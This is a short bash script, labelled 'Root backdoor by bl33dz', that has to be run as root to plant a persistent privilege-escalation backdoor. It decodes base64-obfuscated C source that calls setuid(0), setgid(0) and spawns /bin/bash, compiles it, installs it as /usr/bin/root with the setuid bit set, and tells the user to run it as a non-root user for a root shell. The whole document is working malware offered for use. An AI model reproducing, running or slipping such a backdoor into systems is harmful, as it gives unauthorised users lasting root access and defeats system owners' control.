#!/bin/bash
# Root backdoor by bl33dz

if [ $(id -u) != 0 ]; then
	echo "uid != 0"
	echo "can't run this script"
	exit
fi

echo "I2luY2x1ZGU8c3RkaW8uaD4KI2luY2x1ZGU8dW5pc3RkLmg+CiNpbmNsdWRlPHN0ZGxpYi5oPgoKaW50IG1haW4odm9pZCkgewoJc2V0dWlkKDApOwoJc2V0Z2lkKDApOwoJc3lzdGVtKCIvYmluL2Jhc2giKTsKfQo=" | base64 -d > /tmp/root.c
if [ -f /tmp/root.c ]; then echo "[+] /tmp/root.c created"; else echo "[-] can't create /tmp/root.c"; exit; fi

if [ -x $(command -v gcc) ]; then echo "[+] gcc found"; else echo "[-] gcc not found"; exit; fi
gcc /tmp/root.c -o /tmp/root
rm -rf /tmp/root.c

mv /tmp/root /usr/bin/root
chmod +x /usr/bin/root
chmod +s /usr/bin/root
if [ -x /usr/bin/root ]; then echo "[+] /usr/bin/root created and executable"; else echo "[-] /usr/bin/root not created or not executable"; exit; fi

echo "[+] done"
echo -e "\nrun command \"root\" or \"/usr/bin/root\" as non-root user"
